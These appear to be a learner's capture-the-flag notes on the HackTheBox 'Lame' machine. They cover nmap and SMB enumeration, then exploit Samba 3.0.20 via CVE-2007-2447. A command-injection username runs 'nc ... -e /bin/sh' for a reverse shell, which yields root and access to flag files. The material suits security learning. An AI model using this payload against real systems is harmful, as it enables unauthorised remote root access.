# Lame

It's not a proper writeup since I know what to look for.

I'm only taking some notes while I learn. 


```
sgs@ptbox:~$ nmap -Pn -sV -sC 10.10.10.3

Starting Nmap 7.60 ( https://nmap.org ) at 2020-03-15 16:02 CET
Nmap scan report for 10.10.10.3
Host is up (0.080s latency).
Not shown: 996 filtered ports
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.13
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   NetBIOS computer name: 
|   Workgroup: WORKGROUP\x00
|_  System time: 2020-03-12T08:07:52-04:00
|_smb2-time: Protocol negotiation failed (SMB2)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 67.06 seconds
```

I already know FTP and SSH are not vulnerable here

```
sgs@ptbox:~$ searchsploit Samba 3.0.20
-------------------------------- ----------------------------------
 Exploit Title                  |  Path
                                | (/opt/exploitdb/)
-------------------------------- ----------------------------------
Samba 3.0.20 < 3.0.25rc3 - 'Use | exploits/unix/remote/16320.rb
Samba < 3.0.20 - Remote Heap Ov | exploits/linux/remote/7701.txt
-------------------------------- ----------------------------------
Shellcodes: No Result
Papers: No Result
```

Some googling led me to CVE-2007-2447 and other interesting resources.

 - [CVE-2007-2447 - Samba usermap script](https://amriunix.com/post/cve-2007-2447-samba-usermap-script/) 
 - [HackTheBox - Lame (Without Metasploit)](https://www.youtube.com/watch?v=hYY6Cx4FLDg)
 - [Accessing an SMB Share With Linux Machines](https://www.tldp.org/HOWTO/SMB-HOWTO-8.html)
 - [Samba username map script](https://linxz.co.uk/vulnerabilities/2018/11/14/Samba-username-map-script.html)
```
sgs@ptbox:~$ smbclient -L 10.10.10.3
WARNING: The "syslog" option is deprecated
Enter WORKGROUP\sgs's password: 
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	tmp             Disk      oh noes!
	opt             Disk      
	IPC$            IPC       IPC Service (lame server (Samba 3.0.20-Debian))
	ADMIN$          IPC       IPC Service (lame server (Samba 3.0.20-Debian))
Reconnecting with SMB1 for workgroup listing.
Anonymous login successful

	Server               Comment
	---------            -------

	Workgroup            Master
	---------            -------
	WORKGROUP            LAME
```

```
sgs@ptbox:~$ smbclient //10.10.10.3/tmp
WARNING: The "syslog" option is deprecated
Enter WORKGROUP\sgs's password: 
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> 
```

Open another shell and listen for connections

```
sgs@ptbox:~$ nc -lvp 8080
Listening on [0.0.0.0] (family 0, port 8080)
```

Run the reverse shell

```
smb: \> 
smb: \> logon "./=`nc <MY IP> 8080 -e /bin/sh`"
Password: 
session setup failed: NT_STATUS_LOGON_FAILURE
smb: \> 
```

Got it!

```
Listening on [0.0.0.0] (family 0, port 8080)
Connection from 10.10.10.3 54117 received!

id
uid=0(root) gid=0(root)

ls /root
Desktop
reset_logs.sh
root.txt
vnc.log

cat /root/root.txt
<redacted>

ls /home
ftp
makis
service
user

ls /home/makis
user.txt

cat /home/makis/user.txt
<redacted>
```